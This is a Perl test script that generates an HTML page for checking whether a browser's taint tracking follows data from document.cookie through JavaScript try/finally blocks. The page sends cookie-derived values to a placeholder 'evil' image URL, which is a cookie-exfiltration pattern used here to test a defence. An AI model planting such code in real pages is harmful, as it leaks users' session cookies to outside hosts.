#!/usr/bin/perl

require "xss_basic_vars.pl";

$title = "Test JSOP_FINALLY";
$evil = "document.cookie";

require "xss_basic_uses.pl";

require "xss_basic_cookie.pl";

require "xss_basic_header.pl";

require "xss_basic_bodystart.pl";

require "xss_basic_form.pl";

print qq|
    <script type="text/javascript">
    
		var evil = 2;
		if ($evil) {
			evil = 43;
		}
		var notevil = 42;
		var notevil2 = 42;
		var notevil3 = evil;
		var dut = 7;
		var dut2 = 7;
		var dut3 = 7;

		// shouldn't be evil 
		try {
		} catch (e) {
		} finally {
			dut = notevil;
		}
		
		var url = "$imgevilurl?normal=" + dut;
		document.images[0].src = url;
		
		// if with evil val 
		
		if ($evil) {
			try {
			} catch (e) {
			} finally {
				dut2 = notevil2;
			}
		}
	
		var url2 = "$imgevilurl?if=" + dut2;
		document.images[1].src = url2;
		
		// normal usage 	
		try {
		} catch (e) {
		} finally {
			dut3 = evil;
		}
		var url3 = "$imgevilurl?isevil=" + dut3;
		document.images[2].src = url3;
		
    </script>
|;

require "xss_basic_footer.pl";
